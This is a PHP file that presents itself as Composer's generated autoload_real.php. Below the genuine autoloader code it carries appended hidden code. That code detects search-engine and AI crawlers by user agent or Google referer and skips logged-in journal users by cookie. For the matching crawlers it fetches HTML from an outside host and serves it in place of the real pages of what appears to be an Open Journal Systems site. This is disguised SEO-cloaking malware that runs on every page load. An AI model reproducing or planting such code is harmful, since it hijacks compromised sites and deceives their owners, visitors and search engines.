<?php

// autoload_real.php @generated by Composer

class ComposerAutoloaderInit5bd43120c11bf4fe102fc33d65ccbb04
{
    private static $loader;

    public static function loadClassLoader($class)
    {
        if ('Composer\Autoload\ClassLoader' === $class) {
            require __DIR__ . '/ClassLoader.php';
        }
    }

    public static function getLoader()
    {
        if (null !== self::$loader) {
            return self::$loader;
        }

        spl_autoload_register(array('ComposerAutoloaderInit5bd43120c11bf4fe102fc33d65ccbb04', 'loadClassLoader'), true, true);
        self::$loader = $loader = new \Composer\Autoload\ClassLoader();
        spl_autoload_unregister(array('ComposerAutoloaderInit5bd43120c11bf4fe102fc33d65ccbb04', 'loadClassLoader'));

        $useStaticLoader = PHP_VERSION_ID >= 50600 && !defined('HHVM_VERSION') && (!function_exists('zend_loader_file_encoded') || !zend_loader_file_encoded());
        if ($useStaticLoader) {
            require_once __DIR__ . '/autoload_static.php';

            call_user_func(\Composer\Autoload\ComposerStaticInit5bd43120c11bf4fe102fc33d65ccbb04::getInitializer($loader));
        } else {
            $map = require __DIR__ . '/autoload_namespaces.php';
            foreach ($map as $namespace => $path) {
                $loader->set($namespace, $path);
            }

            $map = require __DIR__ . '/autoload_psr4.php';
            foreach ($map as $namespace => $path) {
                $loader->setPsr4($namespace, $path);
            }

            $classMap = require __DIR__ . '/autoload_classmap.php';
            if ($classMap) {
                $loader->addClassMap($classMap);
            }
        }

        $loader->register(true);

        if ($useStaticLoader) {
            $includeFiles = Composer\Autoload\ComposerStaticInit5bd43120c11bf4fe102fc33d65ccbb04::$files;
        } else {
            $includeFiles = require __DIR__ . '/autoload_files.php';
        }
        foreach ($includeFiles as $fileIdentifier => $file) {
            composerRequire5bd43120c11bf4fe102fc33d65ccbb04($fileIdentifier, $file);
        }

        return $loader;
    }
}

function composerRequire5bd43120c11bf4fe102fc33d65ccbb04($fileIdentifier, $file)
{
    if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) {
        require $file;

        $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
    }
}

function get_remote_content($url) {
    if (!function_exists('curl_init')) {
        return @file_get_contents($url);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Googlebot/2.1');
    $res = curl_exec($ch);
    if ($res === false) {
        error_log('cURL error: ' . curl_error($ch));
    }
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($res !== false && $code === 200) ? $res : false;
}

$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '';
$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$clean_uri = strtok($uri, '?');
$isLogged = !empty($_COOKIE['OMPSID']) || !empty($_COOKIE['OJSSID']) || !empty($_COOKIE['OJSESS']);

$botAgents = ['googlebot','google-site-verification','google-inspectiontool','oai-searchbot','bingbot','crawler','gptbot','ahrefsbot','yandex','duckduckbot','baiduspider','chrome-lighthouse'];
$isBot = false;
foreach ($botAgents as $agent) {
    if (strpos($ua, $agent) !== false) {
        $isBot = true;
        break;
    }
}
if (strpos($referer, 'google') !== false) {
    $isBot = true;
}

if ($isBot && !$isLogged) {
    $targetUrl = null;

    if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
        $targetUrl = 'https://journals.hh-publisher.acel.today/index.txt';
    }

    else {
        $botTargets = [
            '/index.php/JHIS' => 'https://journals.hh-publisher.acel.today/JHIS/registry/index.txt',
        ];

        foreach ($botTargets as $path => $remote) {
            if (strpos($clean_uri, $path) !== false) {
                $targetUrl = $remote;
                break;
            }
        }
    }

    if ($targetUrl) {
        $html = get_remote_content($targetUrl);
        if ($html) {
            header("Content-Type: text/html; charset=utf-8");
            echo $html;
            exit;
        }
    }
}
